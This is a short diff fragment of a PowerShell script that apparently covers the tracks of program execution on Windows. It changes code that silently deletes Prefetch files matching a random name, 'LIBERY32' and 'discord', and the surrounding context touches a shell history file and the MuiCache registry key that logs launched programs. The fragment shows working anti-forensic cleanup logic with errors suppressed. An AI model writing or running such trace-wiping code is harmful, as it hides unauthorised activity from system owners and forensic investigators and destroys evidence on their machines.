@@ -1,10 +1,10 @@
-        } | Set-Content $historyPath
-    } catch {}
-}
 try {
     Get-ChildItem 'C:\Windows\Prefetch' -Filter "*$randomName*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
     Get-ChildItem 'C:\Windows\Prefetch' -Filter '*LIBERY32*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
     Get-ChildItem 'C:\Windows\Prefetch' -Filter '*discord*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Remove-Item ('C:\Windows\Prefetch\*' + $randomName + '*') -Force -ErrorAction SilentlyContinue
+    Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
+    Remove-Item 'C:\Windows\Prefetch\*discord*' -Force -ErrorAction SilentlyContinue
 } catch {}
 try {
     $muiPath = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
